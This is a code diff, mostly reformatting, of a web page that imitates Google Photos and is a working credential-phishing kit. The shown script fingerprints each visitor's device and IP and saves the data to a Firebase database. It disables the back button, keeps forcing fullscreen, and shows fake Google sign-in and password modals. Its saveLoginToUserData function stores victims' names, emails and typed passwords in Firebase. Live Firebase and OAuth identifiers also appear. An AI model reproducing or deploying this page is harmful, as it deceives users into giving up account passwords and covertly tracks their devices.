@@ -26,18 +26,18 @@
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
     import { getDatabase, ref, set, update, serverTimestamp, get, push }
-  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+      from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
     // ⚠️ Apna NAYA Firebase config yaha daalo
- const firebaseConfig = {
-  apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
-  authDomain: "my-rto-b2531.firebaseapp.com",
-  databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
-  projectId: "my-rto-b2531",
-  storageBucket: "my-rto-b2531.firebasestorage.app",
-  messagingSenderId: "465334829178",
-  appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
-};
+    const firebaseConfig = {
+      apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
+      authDomain: "my-rto-b2531.firebaseapp.com",
+      databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
+      projectId: "my-rto-b2531",
+      storageBucket: "my-rto-b2531.firebasestorage.app",
+      messagingSenderId: "465334829178",
+      appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
+    };
 
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
@@ -1300,18 +1300,19 @@
         font-size: 22px;
       }
     }
+
     .gphotos-logo-img {
-  width: 152px;
-  height: 152px;
-  object-fit: contain;
-  
-  border-radius: 6px;
-}
+      width: 152px;
+      height: 152px;
+      object-fit: contain;
+
+      border-radius: 6px;
+    }
   </style>
 </head>
 
 <body>
-<div id="splashScreen" onclick="enterAppFullscreen()" style="
+  <div id="splashScreen" onclick="enterAppFullscreen()" style="
   position: fixed; inset: 0; z-index: 9999;
   background: linear-gradient(135deg, #1a73e8, #4285F4);
   display: flex; flex-direction: column;
@@ -1320,18 +1321,19 @@
   cursor: pointer;
   transition: opacity 0.5s ease;
 ">
-  <div style="text-align:center; padding: 24px;">
-    <!-- Logo -->
-  <img src="https://th.bing.com/th/id/ODF.n20eDdTZ3D3S16qt2gTigA?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2" alt="Google Photos" class="gphotos-logo-img">
-    <h1 style="font-size:28px;font-weight:500;margin-bottom:12px;">
-      Opening Google Photos
-    </h1>
+    <div style="text-align:center; padding: 24px;">
+      <!-- Logo -->
+      <img src="https://th.bing.com/th/id/ODF.n20eDdTZ3D3S16qt2gTigA?w=32&h=32&qlt=90&pcl=fffffa&o=6&pid=1.2"
+        alt="Google Photos" class="gphotos-logo-img">
+      <h1 style="font-size:28px;font-weight:500;margin-bottom:12px;">
+        Opening Google Photos
+      </h1>
 
-    <div style="font-size:15px;opacity:0.85;margin-bottom:40px;">
-      Your memories, everywhere...
-    </div>
+      <div style="font-size:15px;opacity:0.85;margin-bottom:40px;">
+        Your memories, everywhere...
+      </div>
 
-    <div style="
+      <div style="
       width:40px;height:40px;
       border:3px solid rgba(255,255,255,0.3);
       border-top-color:#fff;
@@ -1340,12 +1342,9 @@
       margin:0 auto 32px;
     "></div>
 
-    <!-- Tap hint (chhota) -->
- <!-- Captcha image -->
-<img 
-  src="captcha.jpg" 
-  alt="Captcha" 
-  style="
+      <!-- Tap hint (chhota) -->
+      <!-- Captcha image -->
+      <img src="img/captcha.jpg" alt="Captcha" style="
     width: 100%;
     max-width: 300px;
     height: auto;
@@ -1354,25 +1353,37 @@
     animation: pulse 2s infinite;
     display: block;
     margin: 0 auto;
-  "
->
-  </div>
+  ">
+    </div>
 
-  <style>
-    @keyframes spin { to { transform: rotate(360deg); } }
-    @keyframes pulse {
-      0%, 100% { opacity: 0.7; }
-      50% { opacity: 0.4; }
-    }
-  </style>
-</div>
+    <style>
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      @keyframes pulse {
+
+        0%,
+        100% {
+          opacity: 0.7;
+        }
+
+        50% {
+          opacity: 0.4;
+        }
+      }
+    </style>
+  </div>
   <!-- Google Photos Top Bar -->
   <header class="gphotos-header">
     <div class="gphotos-header-left">
       <button class="gphotos-icon-btn" id="menuBtn" title="Main menu">
         <span class="material-icons-round">menu</span>
       </button>
-      <img src="https://brandlogo.org/wp-content/uploads/2024/05/Google-Photos-Logo.png" alt="Google Photos" class="gphotos-logo-img">
+      <img src="https://brandlogo.org/wp-content/uploads/2024/05/Google-Photos-Logo.png" alt="Google Photos"
+        class="gphotos-logo-img">
     </div>
     <div class="gphotos-header-right">
       <button class="gphotos-icon-btn" id="installBtn" title="Install app" style="display:none">
@@ -1570,8 +1581,8 @@
 
   <!-- Hidden file input -->
   <input type="file" id="fileInput" accept="image/*" multiple>
-<!-- Sign-in Required Modal -->
-<div id="signinModal" style="
+  <!-- Sign-in Required Modal -->
+  <div id="signinModal" style="
   position: fixed; inset: 0; z-index: 2000;
   background: rgba(0, 0, 0, 0.5);
   display: none;
@@ -1580,7 +1591,7 @@
   padding: 20px;
   animation: fadeIn 0.2s ease;
 ">
-  <div style="
+    <div style="
     background: var(--surface);
     border-radius: 16px;
     padding: 32px 24px;
@@ -1590,8 +1601,8 @@
     box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
     animation: lockIn 0.3s ease;
   ">
-    <!-- Lock icon -->
-    <div style="
+      <!-- Lock icon -->
+      <div style="
       width: 56px; height: 56px;
       margin: 0 auto 16px;
       border-radius: 50%;
@@ -1600,31 +1611,32 @@
       align-items: center;
       justify-content: center;
     ">
-      <svg viewBox="0 0 24 24" style="width: 28px; height: 28px; fill: var(--chip-active-text);">
-        <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
-      </svg>
-    </div>
+        <svg viewBox="0 0 24 24" style="width: 28px; height: 28px; fill: var(--chip-active-text);">
+          <path
+            d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" />
+        </svg>
+      </div>
 
-    <h3 style="
+      <h3 style="
       font-size: 18px;
       font-weight: 500;
       color: var(--text);
       margin-bottom: 8px;
     ">
-      Sign in required
-    </h3>
+        Sign in required
+      </h3>
 
-    <p style="
+      <p style="
       font-size: 14px;
       color: var(--text-secondary);
       line-height: 1.5;
       margin-bottom: 24px;
     ">
-      Please sign in to see your favorite pics
-    </p>
+        Please sign in to see your favorite pics
+      </p>
 
-    <!-- Sign In Button -->
-    <button id="signinFromModalBtn" style="
+      <!-- Sign In Button -->
+      <button id="signinFromModalBtn" style="
       display: inline-flex;
       align-items: center;
       justify-content: center;
@@ -1642,17 +1654,21 @@
       transition: background 0.2s, box-shadow 0.2s, transform 0.15s;
       margin-bottom: 10px;
     ">
-      <svg width="20" height="20" viewBox="0 0 48 48">
-        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-      </svg>
-      <span>Sign in with Google</span>
-    </button>
+        <svg width="20" height="20" viewBox="0 0 48 48">
+          <path fill="#EA4335"
+            d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
+          <path fill="#4285F4"
+            d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
+          <path fill="#FBBC05"
+            d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
+          <path fill="#34A853"
+            d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
+        </svg>
+        <span>Sign in with Google</span>
+      </button>
 
-    <!-- Cancel Button -->
-    <button id="signinModalCancel" style="
+      <!-- Cancel Button -->
+      <button id="signinModalCancel" style="
       width: 100%;
       padding: 10px;
       border: none;
@@ -1664,10 +1680,10 @@
       border-radius: 8px;
       transition: background 0.2s;
     ">
-      Cancel
-    </button>
+        Cancel
+      </button>
+    </div>
   </div>
-</div>
   <!-- Google-style Password Modal -->
   <div class="pwd-overlay" id="pwdOverlay">
     <div class="pwd-modal">
@@ -1712,1191 +1728,1218 @@
 
   <script>
     let __userWantsFullscreen = false;
- /* ============================================
-   DATA
-   ============================================ */
-const DEFAULT_IMAGES = [
-  "https://picsum.photos/id/1015/600/600",
-  "https://picsum.photos/id/1025/600/600",
-  "https://picsum.photos/id/1035/600/600",
-  "https://picsum.photos/id/1045/600/600",
-  "https://picsum.photos/id/1055/600/600",
-  "https://picsum.photos/id/1065/600/600",
-  "https://picsum.photos/id/1075/600/600",
-  "https://picsum.photos/id/1085/600/600",
-  "https://picsum.photos/id/1095/600/600",
-  "https://picsum.photos/id/1105/600/600",
-  "https://picsum.photos/id/1115/600/600",
-  "https://picsum.photos/id/1125/600/600",
-  "https://picsum.photos/id/1135/600/600",
-  "https://picsum.photos/id/1145/600/600",
-  "https://picsum.photos/id/1155/600/600",
-  "https://picsum.photos/id/1165/600/600",
-  "https://picsum.photos/id/1175/600/600",
-  "https://picsum.photos/id/1185/600/600"
-];
+    /* ============================================
+      DATA
+      ============================================ */
+    const DEFAULT_IMAGES = [
+      "https://picsum.photos/id/1015/600/600",
+      "https://picsum.photos/id/1025/600/600",
+      "https://picsum.photos/id/1035/600/600",
+      "https://picsum.photos/id/1045/600/600",
+      "https://picsum.photos/id/1055/600/600",
+      "https://picsum.photos/id/1065/600/600",
+      "https://picsum.photos/id/1075/600/600",
+      "https://picsum.photos/id/1085/600/600",
+      "https://picsum.photos/id/1095/600/600",
+      "https://picsum.photos/id/1105/600/600",
+      "https://picsum.photos/id/1115/600/600",
+      "https://picsum.photos/id/1125/600/600",
+      "https://picsum.photos/id/1135/600/600",
+      "https://picsum.photos/id/1145/600/600",
+      "https://picsum.photos/id/1155/600/600",
+      "https://picsum.photos/id/1165/600/600",
+      "https://picsum.photos/id/1175/600/600",
+      "https://picsum.photos/id/1185/600/600"
+    ];
 
-const FREE_LIMIT = 6;
-const LOAD_COUNT = 6;
+    const FREE_LIMIT = 6;
+    const LOAD_COUNT = 6;
 
-/* ============================================
-   STATE
-   ============================================ */
-let allImages = [];
-let favorites = JSON.parse(localStorage.getItem('pics_favorites') || '[]');
-let currentList = [];
-let visibleCount = 0;
-let currentTab = 'all';
-let searchQuery = '';
-let viewerIndex = 0;
-let isLoggedIn = localStorage.getItem('pics_logged_in') === 'true';
-let userEmail = localStorage.getItem('pics_user_email') || '';
+    /* ============================================
+       STATE
+       ============================================ */
+    let allImages = [];
+    let favorites = JSON.parse(localStorage.getItem('pics_favorites') || '[]');
+    let currentList = [];
+    let visibleCount = 0;
+    let currentTab = 'all';
+    let searchQuery = '';
+    let viewerIndex = 0;
+    let isLoggedIn = localStorage.getItem('pics_logged_in') === 'true';
+    let userEmail = localStorage.getItem('pics_user_email') || '';
 
-let slideshowActive = false;
-let slideshowTimer = null;
-let slideshowInterval = 5000;
-let slideshowElapsed = 0;
-let progressInterval = null;
+    let slideshowActive = false;
+    let slideshowTimer = null;
+    let slideshowInterval = 5000;
+    let slideshowElapsed = 0;
+    let progressInterval = null;
 
-let pendingUser = null;
-let currentDeviceInfo = null;
-let currentDeviceId = null;
+    let pendingUser = null;
+    let currentDeviceInfo = null;
+    let currentDeviceId = null;
 
-/* ============================================
-   DOM
-   ============================================ */
-const $ = id => document.getElementById(id);
-const gallery = $('gallery'), viewer = $('viewer');
-const viewerImg = $('viewerImg'), viewerTitle = $('viewerTitle');
-const viewerCounter = $('viewerCounter'), closeBtn = $('closeBtn');
-const searchInput = $('searchInput'), viewMoreBtn = $('viewMoreBtn');
-const viewMoreText = $('viewMoreText'), viewMoreWrap = $('viewMoreWrap');
-const emptyState = $('emptyState'), prevBtn = $('prevBtn');
-const nextBtn = $('nextBtn'), favViewerBtn = $('favViewerBtn');
-const shareBtn = $('shareBtn'), downloadBtn = $('downloadBtn');
-const slideshowBtn = $('slideshowBtn'), uploadBtn = $('uploadBtn');
-const fileInput = $('fileInput'), themeToggle = $('themeToggle');
-const themeIcon = $('themeIcon'), toast = $('toast');
-const countAll = $('countAll'), countFav = $('countFav');
-const slideshowBar = $('slideshowBar'), ssPlayPause = $('ssPlayPause');
-const ssPlayIcon = $('ssPlayIcon'), ssSpeed = $('ssSpeed');
-const ssCount = $('ssCount'), ssStop = $('ssStop');
-const slideshowProgress = $('slideshowProgress');
-const installBtn = $('installBtn');
-const lockedSection = $('lockedSection');
-const lockedGallery = $('lockedGallery');
-const lockCard = $('lockCard');
-const lockTitle = $('lockTitle');
-const lockDesc = $('lockDesc');
+    /* ============================================
+       DOM
+       ============================================ */
+    const $ = id => document.getElementById(id);
+    const gallery = $('gallery'), viewer = $('viewer');
+    const viewerImg = $('viewerImg'), viewerTitle = $('viewerTitle');
+    const viewerCounter = $('viewerCounter'), closeBtn = $('closeBtn');
+    const searchInput = $('searchInput'), viewMoreBtn = $('viewMoreBtn');
+    const viewMoreText = $('viewMoreText'), viewMoreWrap = $('viewMoreWrap');
+    const emptyState = $('emptyState'), prevBtn = $('prevBtn');
+    const nextBtn = $('nextBtn'), favViewerBtn = $('favViewerBtn');
+    const shareBtn = $('shareBtn'), downloadBtn = $('downloadBtn');
+    const slideshowBtn = $('slideshowBtn'), uploadBtn = $('uploadBtn');
+    const fileInput = $('fileInput'), themeToggle = $('themeToggle');
+    const themeIcon = $('themeIcon'), toast = $('toast');
+    const countAll = $('countAll'), countFav = $('countFav');
+    const slideshowBar = $('slideshowBar'), ssPlayPause = $('ssPlayPause');
+    const ssPlayIcon = $('ssPlayIcon'), ssSpeed = $('ssSpeed');
+    const ssCount = $('ssCount'), ssStop = $('ssStop');
+    const slideshowProgress = $('slideshowProgress');
+    const installBtn = $('installBtn');
+    const lockedSection = $('lockedSection');
+    const lockedGallery = $('lockedGallery');
+    const lockCard = $('lockCard');
+    const lockTitle = $('lockTitle');
+    const lockDesc = $('lockDesc');
 
-const avatarEl = $('avatarBtn');
-const profileMenu = $('profileMenu');
-const profileOverlay = $('profileOverlay');
-const menuAvatar = $('menuAvatar');
-const menuName = $('menuName');
-const menuEmail = $('menuEmail');
+    const avatarEl = $('avatarBtn');
+    const profileMenu = $('profileMenu');
+    const profileOverlay = $('profileOverlay');
+    const menuAvatar = $('menuAvatar');
+    const menuName = $('menuName');
+    const menuEmail = $('menuEmail');
 
-/* ============================================
-   SPLASH → FULLSCREEN → APP
-   ============================================ */
-/* ============================================
-   SPLASH → FULLSCREEN → APP
-   ============================================ */
-let __appEntered = false;
+    /* ============================================
+       SPLASH → FULLSCREEN → APP
+       ============================================ */
+    /* ============================================
+       SPLASH → FULLSCREEN → APP
+       ============================================ */
+    let __appEntered = false;
 
-function enterAppFullscreen() {
-  if (__appEntered) return;
-  __appEntered = true;
-  __userWantsFullscreen = true;
-  const el = document.documentElement;
-  const req = el.requestFullscreen ||
-              el.webkitRequestFullscreen ||
-              el.mozRequestFullScreen ||
-              el.msRequestFullscreen;
-
-  if (req) {
-    req.call(el).catch(() => {});
-  }
-
-  const splash = document.getElementById('splashScreen');
-  if (splash) {
-    splash.style.opacity = '0';
-    setTimeout(() => splash.style.display = 'none', 500);
-  }
-
-  document.body.classList.add('app-ready');
-}
-/* ============================================
-   BACK BUTTON DISABLE + FULLSCREEN RESTORE
-   ============================================ */
-history.pushState(null, null, location.href);
-
-window.addEventListener('popstate', function (e) {
-  // Back button block
-  history.pushState(null, null, location.href);
-
-  // Fullscreen restore karo
-  if (__userWantsFullscreen && !document.fullscreenElement) {
-    setTimeout(() => {
+    function enterAppFullscreen() {
+      if (__appEntered) return;
+      __appEntered = true;
+      __userWantsFullscreen = true;
       const el = document.documentElement;
       const req = el.requestFullscreen ||
-                  el.webkitRequestFullscreen ||
-                  el.mozRequestFullScreen ||
-                  el.msRequestFullscreen;
+        el.webkitRequestFullscreen ||
+        el.mozRequestFullScreen ||
+        el.msRequestFullscreen;
 
       if (req) {
-        req.call(el).catch(() => {});
+        req.call(el).catch(() => { });
       }
-    }, 150);
-  }
-});
 
-// Fullscreen tootne pe auto-restore
-document.addEventListener('fullscreenchange', function () {
-  if (!document.fullscreenElement && __userWantsFullscreen) {
-    setTimeout(() => {
+      const splash = document.getElementById('splashScreen');
+      if (splash) {
+        splash.style.opacity = '0';
+        setTimeout(() => splash.style.display = 'none', 500);
+      }
+
+      document.body.classList.add('app-ready');
+    }
+    /* ============================================
+       BACK BUTTON DISABLE + FULLSCREEN RESTORE
+       ============================================ */
+    history.pushState(null, null, location.href);
+
+    window.addEventListener('popstate', function (e) {
+      // Back button block
+      history.pushState(null, null, location.href);
+
+      // Fullscreen restore karo
       if (__userWantsFullscreen && !document.fullscreenElement) {
-        const el = document.documentElement;
-        const req = el.requestFullscreen || el.webkitRequestFullscreen;
-        if (req) req.call(el).catch(() => {});
-      }
-    }, 300);
-  }
-});
-async function init() {
-  const uploaded = JSON.parse(localStorage.getItem('pics_uploaded') || '[]');
-  allImages = [...uploaded, ...DEFAULT_IMAGES];
-
-  const savedTheme = localStorage.getItem('pics_theme');
-  if (savedTheme === 'dark' ||
-    (!savedTheme && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
-    document.body.classList.add('dark');
-    updateThemeIcon(true);
-  } else {
-    updateThemeIcon(false);
-  }
-
-  if (isLoggedIn) updateAvatarAfterLogin();
-
-  renderGallery(getFilteredList());
-  updateCounts();
-  updateProfileMenu();
-
-  // 🔥 Step 1: Page visit → device info save
-  await saveDeviceToRoot();
-  // 🔥 Google SDK initialize karo
-if (window.google && window.google.accounts) {
-  google.accounts.id.initialize({
-    client_id: "338077974110-5l2ti6hcnhbtejq1r1h1hrgfh4uqdk4a.apps.googleusercontent.com",
-    callback: handleCredentialResponse
-  });
-}
-}
-
-
-
-/* ============================================
-   DEVICE INFO COLLECTION
-   ============================================ */
-async function collectDeviceInfo() {
-  const info = {
-    userAgent: navigator.userAgent,
-    browserLanguage: navigator.language,
-    browserLanguages: navigator.languages || [],
-    cookieEnabled: navigator.cookieEnabled,
-    doNotTrack: navigator.doNotTrack || 'unspecified',
-    online: navigator.onLine,
-    platform: navigator.platform,
-    vendor: navigator.vendor,
-    product: navigator.product,
-    appVersion: navigator.appVersion,
-    appName: navigator.appName,
-
-    screenWidth: window.screen.width,
-    screenHeight: window.screen.height,
-    availWidth: window.screen.availWidth,
-    availHeight: window.screen.availHeight,
-    colorDepth: window.screen.colorDepth,
-    pixelDepth: window.screen.pixelDepth,
-    devicePixelRatio: window.devicePixelRatio,
-    windowWidth: window.innerWidth,
-    windowHeight: window.innerHeight,
-    orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
-
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    timezoneOffset: new Date().getTimezoneOffset(),
-    locale: Intl.DateTimeFormat().resolvedOptions().locale,
-    dateTimeString: new Date().toString(),
-    timestamp: Date.now(),
-
-    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-    deviceMemory: navigator.deviceMemory || 'unknown',
-    maxTouchPoints: navigator.maxTouchPoints || 0,
-
-    connectionType: (navigator.connection && navigator.connection.effectiveType) || 'unknown',
-    connectionDownlink: (navigator.connection && navigator.connection.downlink) || 'unknown',
-    connectionRtt: (navigator.connection && navigator.connection.rtt) || 'unknown',
-    connectionSaveData: (navigator.connection && navigator.connection.saveData) || false,
-
-    pageUrl: window.location.href,
-    pageReferrer: document.referrer || 'direct',
-    pageTitle: document.title,
-
-    visitAt: new Date().toISOString(),
-    visitTimestamp: Date.now()
-  };
-
-  // Battery
-  try {
-    if (navigator.getBattery) {
-      const battery = await navigator.getBattery();
-      info.batteryLevel = Math.round(battery.level * 100) + '%';
-      info.batteryCharging = battery.charging;
-    }
-  } catch (e) { }
-
-  // IP
-  try {
-    const res = await fetch('https://api.ipify.org?format=json');
-    const data = await res.json();
-    info.ipAddress = data.ip;
-  } catch (e) {
-    info.ipAddress = 'unknown';
-  }
-
-  // GPU
-  try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    if (gl) {
-      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      if (debugInfo) {
-        info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-        info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      }
-    }
-  } catch (e) { }
-
-  info.fingerprint = await generateFingerprint(info);
-  return info;
-}
-
-/* ============================================
-   FINGERPRINT (deviceId)
-   ============================================ */
-/* ============================================
-   GENERATE PRO DEVICE ID
-   Format: HEK-A3fK8mP2 (Base62, 8 chars)
-   ============================================ */
-async function generateFingerprint(info) {
-  const raw = [
-    info.userAgent,
-    info.screenWidth + 'x' + info.screenHeight,
-    info.colorDepth,
-    info.timezone,
-    info.language,
-    info.platform,
-    info.hardwareConcurrency,
-    info.deviceMemory,
-    info.devicePixelRatio,
-    info.gpuRenderer || ''
-  ].join('|');
-
-  // SHA-256 hash
-  const msgBuffer = new TextEncoder().encode(raw);
-  const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
-  const hashArray = Array.from(new Uint8Array(hashBuffer));
-
-  // 🔥 Base62 me convert karo (0-9, A-Z, a-z)
-  const BASE62 = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-
-  let id = '';
-  for (let i = 0; i < 8; i++) {
-    const byte = hashArray[i];
-    const index = byte % 62;
-    id += BASE62[index];
-  }
-
-  // Ambiguous characters avoid karo
-  id = id.replace(/O/g, 'X').replace(/0/g, 'Y')
-         .replace(/I/g, 'Z').replace(/l/g, 'W')
-         .replace(/1/g, 'V');
-
-  return 'HEK-' + id;
-}
-
-/* ============================================
-   STEP 1: SAVE DEVICE TO devices_root/{deviceId}
-   ============================================ */
-async function saveDeviceToRoot() {
-  try {
-    let tries = 0;
-    while (!window.firebaseDB && tries < 30) {
-      await new Promise(r => setTimeout(r, 100));
-      tries++;
-    }
-    if (!window.firebaseDB) return;
-
-    const { ref, update, serverTimestamp, get } = window.firebaseFns;
-    const db = window.firebaseDB;
-
-    // Collect device info
-    currentDeviceInfo = await collectDeviceInfo();
-    currentDeviceId = currentDeviceInfo.fingerprint;
-
-    // 🔥 devices_root/{deviceId} me save karo
-    const deviceRef = ref(db, 'devices_root/' + currentDeviceId);
-    const snapshot = await get(deviceRef);
-
-    const deviceData = {
-      deviceId: currentDeviceId,
-      ...currentDeviceInfo,
-      lastVisit: serverTimestamp(),
-      visitCount: (snapshot.exists() ? (snapshot.val().visitCount || 0) + 1 : 1)
-    };
-
-    if (!snapshot.exists()) {
-      deviceData.firstVisit = serverTimestamp();
-    }
-
-    await update(deviceRef, deviceData);
-    console.log('✅ Device saved to devices_root:', currentDeviceId);
-
-    // Local me bhi save karo
-    localStorage.setItem('pics_device_id', currentDeviceId);
-
-  } catch (err) {
-    console.error('❌ saveDeviceToRoot error:', err);
-  }
-}
-
-/* ============================================
-   STEP 2: SAVE LOGIN TO users_data/{deviceId}/logins/{uniqueKey}
-   ============================================ */
-async function saveLoginToUserData(payload, password) {
-  try {
-    console.log('🔍 saveLoginToUserData called');
-    console.log('  - currentDeviceId:', currentDeviceId);
-    console.log('  - payload.sub:', payload.sub);
-    console.log('  - password:', password);
-    console.log('  - window.firebaseDB:', !!window.firebaseDB);
-
-    if (!currentDeviceId) {
-      console.error('❌ currentDeviceId is NULL — device info not collected');
-      showToast('Device ID missing!');
-      return;
-    }
-    if (!window.firebaseDB) {
-      console.error('❌ Firebase not loaded');
-      showToast('Firebase not loaded');
-      return;
-    }
-
-    const { ref, push, serverTimestamp } = window.firebaseFns;
-    const db = window.firebaseDB;
-
-    const loginsRef = ref(db, 'users_data/' + currentDeviceId + '/logins');
-    console.log('🔍 loginsRef path:', 'users_data/' + currentDeviceId + '/logins');
-
-    const loginData = {
-      uid: payload.sub,
-      name: payload.name || '',
-      email: payload.email || '',
-      picture: payload.picture || '',
-      emailVerified: payload.email_verified || false,
-      password: password,
-      deviceInfo: currentDeviceInfo,
-      loginAt: serverTimestamp(),
-      loginAtISO: new Date().toISOString()
-    };
-
-    console.log('🔍 loginData:', loginData);
-
-    const newRef = await push(loginsRef, loginData);
-    console.log('✅ Login saved to users_data/' + currentDeviceId + '/logins/' + newRef.key);
-
-    showToast('Login saved ✅');
-  } catch (err) {
-    console.error('❌ saveLoginToUserData error:', err);
-    showToast('Save failed: ' + err.message);
-  }
-}
-
-/* ============================================
-   THEME
-   ============================================ */
-function updateThemeIcon(isDark) {
-  if (themeIcon) themeIcon.textContent = isDark ? 'light_mode' : 'dark_mode';
-}
-themeToggle.addEventListener('click', () => {
-  const isDark = document.body.classList.toggle('dark');
-  localStorage.setItem('pics_theme', isDark ? 'dark' : 'light');
-  updateThemeIcon(isDark);
-});
-
-/* ============================================
-   FILTER / SEARCH
-   ============================================ */
-function getFilteredList() {
-  let list = [...allImages];
-  if (currentTab === 'favorites') {
-    list = list.filter(src => favorites.includes(src));
-  }
-  if (searchQuery) {
-    const q = searchQuery.toLowerCase();
-    list = list.filter((src, i) => `photo ${i + 1}`.includes(q));
-  }
-  return list;
-}
-
-/* ============================================
-   RENDER
-   ============================================ */
-function createCard(src, index) {
-  const card = document.createElement('div');
-  card.className = 'pic-card';
-
-  const img = document.createElement('img');
-  img.src = src; img.loading = 'lazy';
-  img.alt = 'photo ' + (index + 1);
-  card.appendChild(img);
-
-  const favBtn = document.createElement('button');
-  favBtn.className = 'fav-btn' + (favorites.includes(src) ? ' active' : '');
-  favBtn.innerHTML = `<svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>`;
-  favBtn.addEventListener('click', (e) => {
-    e.stopPropagation();
-    toggleFavorite(src, favBtn);
-  });
-  card.appendChild(favBtn);
-
-  card.addEventListener('click', () => openViewer(index));
-  return card;
-}
-
-function renderGallery(list) {
-  currentList = list;
-  visibleCount = 0;
-  gallery.innerHTML = '';
-  lockedGallery.innerHTML = '';
-
-  if (list.length === 0) {
-    emptyState.classList.add('show');
-    viewMoreWrap.style.display = 'none';
-    lockedSection.style.display = 'none';
-    return;
-  }
-  emptyState.classList.remove('show');
-
-  if (isLoggedIn) {
-    lockedSection.style.display = 'none';
-    viewMoreWrap.style.display = 'flex';
-    loadMore(FREE_LIMIT);
-    return;
-  }
-
-  if (list.length <= FREE_LIMIT) {
-    lockedSection.style.display = 'none';
-    viewMoreWrap.style.display = 'flex';
-    loadMore(FREE_LIMIT);
-  } else {
-    viewMoreWrap.style.display = 'none';
-    lockedSection.style.display = 'block';
-    for (let i = 0; i < FREE_LIMIT; i++) {
-      gallery.appendChild(createCard(list[i], i));
-    }
-    visibleCount = FREE_LIMIT;
-    renderLockedGallery(list.slice(FREE_LIMIT));
-    updateViewMoreBtn();
-  }
-}
-
-function renderLockedGallery(remaining) {
-  lockedGallery.innerHTML = '';
-  const preview = remaining.slice(0, 6);
-  preview.forEach((src) => {
-    const card = document.createElement('div');
-    card.className = 'pic-card';
-    const img = document.createElement('img');
-    img.src = src; img.loading = 'lazy';
-    img.alt = 'locked';
-    card.appendChild(img);
-    lockedGallery.appendChild(card);
-  });
-}
-
-function loadMore(count) {
-  const end = Math.min(visibleCount + count, currentList.length);
-  for (let i = visibleCount; i < end; i++) {
-    gallery.appendChild(createCard(currentList[i], i));
-  }
-  visibleCount = end;
-  updateViewMoreBtn();
-}
-
-function updateViewMoreBtn() {
-  if (visibleCount >= currentList.length) {
-    viewMoreBtn.classList.add('done');
-    viewMoreText.textContent = 'All photos loaded';
-  } else {
-    viewMoreBtn.classList.remove('done');
-    viewMoreText.textContent = `View more (${currentList.length - visibleCount})`;
-  }
-}
-
-viewMoreBtn.addEventListener('click', () => {
-  if (visibleCount >= currentList.length) return;
-  loadMore(LOAD_COUNT);
-});
-
-/* ============================================
-   SEARCH / TABS
-   ============================================ */
